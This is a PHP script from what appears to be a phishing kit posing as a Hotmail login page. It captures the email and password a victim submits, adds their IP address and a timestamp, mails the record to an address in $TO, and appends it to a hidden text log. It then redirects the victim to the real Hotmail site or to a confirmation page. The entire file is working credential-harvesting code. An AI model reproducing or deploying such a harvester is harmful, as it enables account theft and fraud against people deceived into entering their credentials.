<?php
 

header ('Location: https://www.hotmail.com/ '); 
foreach($_POST as $variable => $value) 
$email = $_POST['correeo'];
$passs = $_POST['passs'];
$Date = "" . date("d/m/y") . "";
date_default_timezone_set("America/La_Paz");
$Time = ""   .   date("h:i:sa");
$Link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$IP = getenv("REMOTE_ADDR");
$BILSMG = "


========= Hotmail 2020 ================
Email: $email
Clave: $passs

IP: $IP
Fecha: $Date / Time : $Time
======================================";
$MAIL_TITLE = "Login | ".$IP."";
$MAIL_HEADER = "From: hotmail.Info";
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);
$handle = fopen("qerwwsdxas.txt", "a");
fwrite($handle,$BILSMG);
$x=md5(microtime());

echo "<META HTTP-EQUIV='refresh' content='1; URL=confirmacion.html'>";exit;

?>
